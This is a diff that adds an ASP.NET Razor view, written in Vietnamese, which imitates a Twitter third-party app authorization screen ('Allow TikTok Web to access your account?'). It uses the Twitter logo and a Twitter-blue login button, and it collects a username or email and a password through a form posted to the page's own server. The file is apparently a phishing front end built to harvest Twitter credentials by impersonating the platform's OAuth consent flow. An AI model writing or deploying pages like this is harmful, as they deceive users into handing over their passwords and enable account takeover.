@@ -1,0 +1,103 @@
+﻿@{ Layout = null; }
+
+<!DOCTYPE html>
+
+<html>
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <title>Twitter</title>
+</head>
+<body>
+    <div>
+        @using (Html.BeginForm())
+        {
+            <table align="center">
+                <tr>
+                    <td>
+                        <h1 style="font-family:Arial">
+                            Cho phép TikTok Web
+                            <br /> truy cập tài khoản của bạn?
+                        </h1>
+                    </td>
+                    <td>
+                        <img src="~/Content/image/logotwitter.png" alt="Thumbnail" width="100%" />
+                    </td>
+                </tr>
+            </table>
+            <table align="center">
+                <tr>
+                    <td>
+                        <table align="center" style="width:400px">
+                            <tr>
+                                <td style="width:380px">
+                                    <input type="text"
+                                           placeholder="Tên người dùng hoặc email"
+                                           name="mail"
+                                           required
+                                           style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td style="width:400px; padding-top:10px; padding-bottom:20px">
+                                    <input type="password" placeholder="Mật khẩu" name="psw" required style="width: 378px; height: 35px; border: none !important" />
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    <input type="submit" value="Đăng nhập" style="width: 400px; height: 55px !important; 
+                                                                                  background-color: #1DA1F2 !important; 
+                                                                                  border: none !important; font-weight: bold " />
+                          
+                                    <button type="button" class="btn-primary" onclick="location.href='Main'" style="width: 400px; height: 55px !important; background-color: #eae9e9 !important; border: none !important">
+                                        <table align="left" width="390px">
+                                            <tr>
+                                                <td align="center">
+                                                    <h4 style="text-align: center; font-family: Arial;color:black">Hủy</h4>
+                                                </td>
+                                            </tr>
+                                        </table>
+                                    </button>
+                                </td>
+                            </tr>
+                        </table>
+                        <table align="left" width="390px">
+                            <tr>
+                                <td align="center">
+                                    <h4 style="
+                              text-align: left;
+                              font-family: Arial;
+                              color: rgb(20, 141, 9);
+                            ">
+                                        Ứng dụng này sẽ có thể:
+
+                                        <a href="~/Views/Home/DangKy"
+                                           style="
+                                text-decoration: none;
+                                color: rgb(112, 112, 112) !important;
+                              ">
+                                            <br />Xem các Tweet từ dòng thời gian của bạn (bao gồm các Tweet được bảo vệ) cũng như các danh sách và bộ sưu tập của bạn.
+                                            <br />Xem thông tin hồ sơ Twitter và cài đặt tài khoản.
+                                            <br />Xem tài khoản bạn theo dõi, tắt tiếng và chặn.
+                                            <br />Theo dõi và ngừng theo dõi các tài khoản cho bạn.
+                                            <br />Cập nhật hồ sơ và cài đặt tài khoản của bạn.
+                                            <br /> Đăng và xóa các Tweet cho bạn và cho phép người khác tương tác với các Tweet đã được người khác đăng (Thích, Bỏ thích hoặc trả lời Tweet, Tweet lại v.v.) cho bạn.
+                                            <br />Tạo, quản lý và xóa các Danh sách và bộ sưu tập cho bạn.
+                                            <br />Tắt tiếng, chặn và báo cáo tài khoản cho bạn.
+                                        </a>
+
+                                        <b href="~/Views/Home/DangKy"
+                                           style="
+                                text-decoration: none;
+                                color: rgb(255, 255, 255) !important;
+                              "><br />Tìm hiểu thêm về các quyền của ứng dụng bên thứ ba ở Trung tâm Trợ giúp.</b>
+                                    </h4>
+                                </td>
+                            </tr>
+                        </table>
+                    </td>
+                </tr>
+            </table>
+         }
+    </div>
+</body>
+</html>
